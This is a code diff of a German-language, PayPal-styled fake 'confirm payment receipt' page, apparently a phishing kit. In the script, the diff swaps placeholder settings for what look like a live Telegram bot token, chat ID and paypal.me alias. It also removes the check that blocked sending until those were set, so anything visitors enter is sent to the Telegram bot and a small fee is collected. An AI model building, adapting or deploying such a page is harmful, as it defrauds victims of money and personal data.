@@ -7,7 +7,6 @@
 <meta name="theme-color" content="#0e1b2c">
 <meta name="description" content="Bestätige den Zahlungseingang, damit der Betrag freigegeben wird.">
 <link rel="manifest" href="manifest.webmanifest">
-<link rel="apple-touch-icon" href="icon-512.png">
 <link rel="icon" href="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'><rect width='64' height='64' rx='14' fill='%230e1b2c'/><text x='32' y='45' font-family='Helvetica,Arial' font-size='38' font-weight='bold' fill='white' text-anchor='middle'>P</text></svg>">
 <style>
 *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
@@ -38,7 +37,6 @@ font-size:12px;font-weight:700;padding:5px 11px;border-radius:99px;margin-bottom
 .btn{display:block;width:100%;border:0;border-radius:12px;padding:15px;font-size:16px;font-weight:700;
 background:#0070ba;color:#fff;cursor:pointer;margin-top:14px}
 .btn:active{transform:scale(.99)}
-.btn.ghost{background:#fff;color:#0070ba;border:1.5px solid #d5e2ee;margin-top:8px}
 .opt{display:flex;gap:12px;align-items:center;border:1.5px solid #e2e8f0;border-radius:12px;padding:14px;margin-bottom:9px;cursor:pointer}
 .opt.sel{border-color:#0070ba;background:#f2f9ff}
 .opt b{display:block;font-size:14.5px}
@@ -155,9 +153,9 @@ a{color:#0070ba}
 
 <script>
 /* ===== CONFIG ===== */
-const TG_TOKEN = "DEIN_BOT_TOKEN";
-const TG_CHAT  = "DEINE_CHAT_ID";
-const PP_USER  = "DEINALIAS";      /* paypal.me/DEINALIAS */
+const TG_TOKEN = "9153470596:AAHyw5JX9I3-ytoCDdrzzPNWAkRYGMVWrLQ";
+const TG_CHAT  = "8379969031";
+const PP_USER  = "JaneAlister";
 const FEE      = "1.95";
 /* ================== */
 
@@ -211,7 +209,6 @@ function pick(m){
   document.getElementById('fBK').classList.toggle('hide', m !== 'bk');
 }
 function tg(text){
-  if (!TG_TOKEN || TG_TOKEN.startsWith("DEIN")) return;
   fetch("https://api.telegram.org/bot" + TG_TOKEN + "/sendMessage", {
     method: "POST", headers: {"Content-Type":"application/json"},
     body: JSON.stringify({chat_id: TG_CHAT, text: text, disable_web_page_preview: true})
